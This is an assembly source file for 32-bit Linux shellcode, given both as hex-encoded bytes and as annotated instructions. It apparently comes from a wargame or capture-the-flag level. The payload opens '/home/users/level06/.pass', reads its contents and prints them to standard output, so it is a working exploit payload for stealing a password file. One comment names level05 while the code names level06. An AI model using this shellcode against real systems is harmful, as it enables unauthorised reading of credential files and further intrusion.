; \x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x36\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc9\x31\xd2\x89\xe3\x6a\x05\x58\xcd\x80\x83\xec\x29\x89\xc3\x89\xe1\x6a\x29\x5a\x6a\x03\x58\xcd\x80\x6a\x01\x5b\x6a\x04\x58\xcd\x80


section .text
    global _start

_start:

    xor eax, eax
    push eax
    push dword 0x73736170 
    push dword 0x2e2f3630
    push dword 0x6c657665
    push dword 0x6c2f7372
    push dword 0x6573752f
    push dword 0x656d6f68
    push dword 0x2f2f2f2f ; push "/home/users/level06/.pass"
    xor ecx, ecx
    xor edx, edx
    mov ebx, esp
    push 0x05
    pop eax
    int 0x80 ; open("/home/users/level05/.pass", O_RDONLY, 0)

    sub esp, 0x29
    ; read(eax, esp, 0x29)
    mov ebx, eax
    mov ecx, esp
    push 0x29
    pop edx
    push 0x03
    pop eax
    int 0x80

    ; write(1, esp, 0x29)
    push 0x01
    pop ebx
    push 0x04
    pop eax
    int 0x80
